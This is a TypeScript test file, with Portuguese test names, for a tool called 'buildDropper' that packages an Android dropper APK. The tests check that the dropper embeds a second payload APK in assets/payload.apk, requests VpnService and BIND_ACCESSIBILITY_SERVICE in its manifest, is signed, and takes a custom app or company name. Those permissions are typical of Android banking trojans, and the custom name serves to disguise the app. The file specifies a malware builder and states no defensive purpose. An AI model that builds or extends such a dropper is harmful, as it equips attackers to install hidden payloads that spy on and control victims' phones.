import { describe, it, expect } from "vitest";
import AdmZip from "adm-zip";
import { buildDropper } from "./dropperBuilder";

// ─── Helpers ──────────────────────────────────────────────────────────────────

function createMinimalApk(): Buffer {
  const zip = new AdmZip();
  zip.addFile("AndroidManifest.xml", Buffer.from('<?xml version="1.0"?><manifest package="com.test.payload"/>'));
  zip.addFile("classes.dex", Buffer.from("DEX_PLACEHOLDER"));
  return zip.toBuffer();
}

// ─── Testes ───────────────────────────────────────────────────────────────────

describe("buildDropper", () => {
  it("deve gerar um APK dropper com nome personalizado", async () => {
    const payloadApk = createMinimalApk();
    const result = await buildDropper({
      appName: "MeuApp",
      payloadApkBuffer: payloadApk,
    });

    expect(result.apkBuffer).toBeDefined();
    expect(result.apkBuffer.length).toBeGreaterThan(0);
    expect(result.log.some((l) => l.includes("MeuApp"))).toBe(true);
  }, 30000);

  it("deve embutir o APK payload em assets/payload.apk", async () => {
    const payloadApk = createMinimalApk();
    const result = await buildDropper({
      appName: "TestDropper",
      payloadApkBuffer: payloadApk,
    });

    const zip = new AdmZip(result.apkBuffer);
    const payloadEntry = zip.getEntry("assets/payload.apk");
    expect(payloadEntry).toBeDefined();
    expect(payloadEntry!.getData().length).toBeGreaterThan(0);
  }, 30000);

  it("deve incluir VpnService no manifest do dropper", async () => {
    const payloadApk = createMinimalApk();
    const result = await buildDropper({
      appName: "VpnDropper",
      payloadApkBuffer: payloadApk,
    });

    const zip = new AdmZip(result.apkBuffer);
    const manifestEntry = zip.getEntry("AndroidManifest.xml");
    expect(manifestEntry).toBeDefined();
    const manifest = manifestEntry!.getData().toString("utf-8");
    expect(manifest).toContain("VpnService");
  }, 30000);

  it("deve incluir BIND_ACCESSIBILITY_SERVICE no manifest", async () => {
    const payloadApk = createMinimalApk();
    const result = await buildDropper({
      appName: "AccessibilityDropper",
      payloadApkBuffer: payloadApk,
    });

    const zip = new AdmZip(result.apkBuffer);
    const manifestEntry = zip.getEntry("AndroidManifest.xml");
    const manifest = manifestEntry!.getData().toString("utf-8");
    expect(manifest).toContain("BIND_ACCESSIBILITY_SERVICE");
  }, 30000);

  it("deve incluir META-INF/CERT.RSA (assinatura digital)", async () => {
    const payloadApk = createMinimalApk();
    const result = await buildDropper({
      appName: "SignedDropper",
      payloadApkBuffer: payloadApk,
    });

    const zip = new AdmZip(result.apkBuffer);
    const certEntry = zip.getEntry("META-INF/CERT.RSA");
    expect(certEntry).toBeDefined();
  }, 30000);

  it("deve usar package name baseado no nome do app", async () => {
    const payloadApk = createMinimalApk();
    const result = await buildDropper({
      appName: "MinhaEmpresa",
      payloadApkBuffer: payloadApk,
    });

    expect(result.log.some((l) => l.includes("minhaempresa") || l.includes("MinhaEmpresa"))).toBe(true);
  }, 30000);
});
